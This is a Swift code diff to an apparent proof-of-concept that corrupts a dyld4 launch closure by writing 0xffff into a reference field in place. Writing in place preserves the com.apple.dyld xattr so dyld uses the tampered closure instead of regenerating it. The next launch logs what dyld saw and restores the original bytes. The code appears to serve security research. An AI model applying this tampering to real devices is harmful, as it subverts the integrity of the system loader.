@@ -94,6 +94,19 @@ enum Dyld4 {
         return Int(setxattr(cpath, name, UnsafeRawPointer(buf), bytes.count, 0, 0))
     }
 
+    /// Overwrite bytes IN PLACE. FileHandle writes to the existing inode, so
+    /// the `com.apple.dyld` xattr survives — unlike .atomic, which replaces
+    /// the file and makes dyld regenerate a clean closure.
+    static func writeInPlace(_ bytes: Data, at offset: UInt64, in path: String) -> Bool {
+        guard let fh = FileHandle(forWritingAtPath: path) else { return false }
+        do {
+            try fh.seek(toOffset: offset)
+            try fh.write(contentsOf: bytes)
+            try fh.close()
+            return true
+        } catch { try? fh.close(); return false }
+    }
+
     static func tokenSidecar() -> URL {
         FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
             .appendingPathComponent("dyld4-token.bin")
@@ -156,21 +169,14 @@ enum Dyld4 {
         }
         let refOff = Int(off) + Int(first) + 6
         guard refOff + 2 <= original.count else { return "PoC: bad ref offset" }
-
-        // ★ Capture the token from the LIVE closure before any write. An
-        // atomic write drops xattrs, so a backup file cannot supply it.
-        guard let tok = tokenBytes(path) else { return "PoC: no boot token on live closure" }
-        try? tok.write(to: tokenSidecar(), options: .atomic)
-        let backup = path + ".probe-bak"
-        try? original.write(to: URL(fileURLWithPath: backup), options: .atomic)
-
-        var crafted = original
-        crafted[refOff] = 0xff; crafted[refOff + 1] = 0xff
-        guard (try? crafted.write(to: URL(fileURLWithPath: path), options: .atomic)) != nil else {
-            return "PoC: patch write failed"
+        // Keep the original bytes for the next launch's restore (in-place).
+        try? original.write(to: tokenSidecar().deletingLastPathComponent()
+            .appendingPathComponent("dyld4-original.bin"), options: .atomic)
+        guard writeInPlace(Data([0xff, 0xff]), at: UInt64(refOff), in: path) else {
+            return "PoC: in-place patch failed"
         }
-        let applied = applyToken(tok, to: path)
-        return String(format: "PATCHED ref=0xffff count=%u token-bytes=%d applied=%d — FORCE-QUIT AND REOPEN", count, tok.count, applied)
+        let t = token(path)
+        return String(format: "PATCHED-IN-PLACE ref=0xffff count=%u token=%@ — FORCE-QUIT AND REOPEN", count, t)
     }
 
     /// Called at startup. If a PoC patch is pending, restore it and report
@@ -178,22 +184,18 @@ enum Dyld4 {
     @discardableResult
     static func finishPendingPoC() -> String? {
         guard let path = paths().first else { return nil }
-        let backup = path + ".probe-bak"
-        guard FileManager.default.fileExists(atPath: backup),
-              let original = FileManager.default.contents(atPath: backup) else { return nil }
-        // Inspect the closure dyld just consumed, BEFORE restoring it.
+        let backup = tokenSidecar().deletingLastPathComponent()
+            .appendingPathComponent("dyld4-original.bin")
+        guard let original = try? Data(contentsOf: backup) else { return nil }
         let seen = Dyld4.inspect(path)
         let evidence = String(format: "POC-SEEN-BY-DYLD count=%u ref=%@ idx=%@ verdict=%@ boot-token=%@",
                               seen.count,
                               seen.offenders.first.map { String(format: "0x%04x", $0.ref) } ?? "none",
                               seen.offenders.first.map { String($0.idx) } ?? "none",
                               seen.verdict, seen.bootToken)
-        try? original.write(to: URL(fileURLWithPath: path), options: .atomic)
-        let tok = try? Data(contentsOf: tokenSidecar())
-        let applied = applyToken(tok, to: path)
-        try? FileManager.default.removeItem(atPath: backup)
-        try? FileManager.default.removeItem(at: tokenSidecar())
-        return evidence + String(format: " ; RESTORED token=%d", applied)
+        let restored = writeInPlace(original, at: 0, in: path)
+        try? FileManager.default.removeItem(at: backup)
+        return evidence + String(format: " ; RESTORED-IN-PLACE=%d", restored ? 1 : 0)
     }
 }
 
